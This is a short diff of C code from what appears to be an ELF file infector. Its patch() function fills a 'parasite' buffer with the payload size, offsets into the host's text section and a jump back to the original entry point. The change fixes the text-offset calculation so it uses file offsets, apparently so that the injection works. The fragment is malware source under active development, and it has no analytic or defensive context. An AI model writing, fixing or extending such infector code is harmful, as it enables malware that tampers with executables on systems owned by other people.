@@ -36,7 +36,7 @@ patch(Elf64_Ehdr *ehdr, Elf64_Phdr *phdr, Elf64_Shdr *shdr)
 {
 	*(uint32_t *)(parasite_buf + PARA_LEN) = (uint32_t)(PARASITE_SIZE);
 	*(uint32_t *)(parasite_buf + TEXT_OFF) = (uint32_t)(shdr->sh_offset
-		- (phdr->p_vaddr + phdr->p_memsz + TEXT_OFF + 4));
+		- (phdr->p_offset + phdr->p_filesz + TEXT_OFF + 4));
 	*(uint32_t *)(parasite_buf + TEXT_LEN) = (uint32_t)(shdr->sh_size);
 	*(uint32_t *)(parasite_buf + JUMP_OLD) = (uint32_t)(ehdr->e_entry
 		- (phdr->p_vaddr + phdr->p_memsz + JUMP_OLD + 4));
